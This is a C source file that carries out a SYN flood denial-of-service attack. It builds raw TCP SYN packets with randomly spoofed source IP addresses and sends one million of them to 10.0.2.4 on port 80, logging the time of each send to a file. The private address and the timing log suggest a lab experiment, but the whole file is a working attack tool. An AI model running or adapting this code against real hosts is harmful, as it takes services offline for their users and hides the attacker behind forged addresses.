#include <stdio.h>   
/*
	Syn Flood DOS with LINUX sockets
*/
#include <time.h>
#include <stdlib.h>
#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in.h>
#include<arpa/inet.h>
#include <sys/time.h> // gettimeofday()

char * iprand();
struct pseudo_header_udp
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};
struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (int argc, char **argv)
{
	FILE *fd;
    fd=fopen("syn_results_c.txt","w+");
	double sum=0;
    int count=0;
	struct timeval begin,end;
	char * dest="10.0.2.4";
	int port=80;
	char * protocol ="TCP";



		
srand(time(NULL));
 //  int s=create_socket();
	// //Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}
      for(int i=0;i<100;i++)
	   {
           for(int j=0;j<10000;j++){
               count++;
			//   gettimeofday(&begin,0);
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32], *pseudogram;
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;


	//char * srciprand=iprand();
	//strcpy(source_ip , "192.168.1.2");
  	strcpy(source_ip , iprand());

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr (dest);
	
	memset (datagram, 0, 4096);	/* zero out the buffer */
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->protocol = IPPROTO_TCP;
	
	iph->id = htons(54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

	

	//TCP Header
	tcph->source = htons (1234);
	tcph->dest = htons (port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	//Now the IP checksum
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
		gettimeofday(&begin,0);
		//Send the packet
		if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			//printf("%s\n",source_ip);
           printf ("Packet Send from source ip %s \n",source_ip);
			gettimeofday(&end,0);
    	long seconds = end.tv_sec - begin.tv_sec;
    	long microseconds = end.tv_usec - begin.tv_usec;
    	double time = seconds+microseconds*1e-6;
    	sum+=time;
    	//printf("RTT time  in ms is %lf\n",time*1000);
    	char buffer[50];
    	sprintf(buffer, "%d,%f",count,time*1000);
    	fprintf(fd, "%s \n",buffer);
    	fflush(fd);
		}
           }
	 }
	double avg_t=sum/count;
    //printf("\n AVG time  in ms is %lf\n",avg_t*1000);
	char buffer[100];
	char buffer2[100];
    sprintf(buffer, "\n AVG time  in ms is: %lf",avg_t*1000);
    sprintf(buffer2, "\n All time  in ms is: %lf",sum*1000);
    fprintf(fd, "%s \n",buffer);
    fprintf(fd, "%s \n",buffer2);
	fflush(fd);
	fclose(fd);
    	return 0;
}
char * iprand(){
char * s;
char  c1[6];
char  c2[6];
char  c3[6];
char  c4[6];

// srand(time(NULL));
int cnt1=rand()%255;
int cnt2=rand()%255;
int cnt3=rand()%255;
int cnt4=rand()%255;
sprintf(c1,"%d",cnt1);
sprintf(c2,"%d",cnt2);
sprintf(c3,"%d",cnt3);
sprintf(c4,"%d",cnt4);
s=strcat(c1,".");
s=strcat(s,c2);
s=strcat(s,".");
s=strcat(s,c3);
s=strcat(s,".");
s=strcat(s,c4);

return s;
}
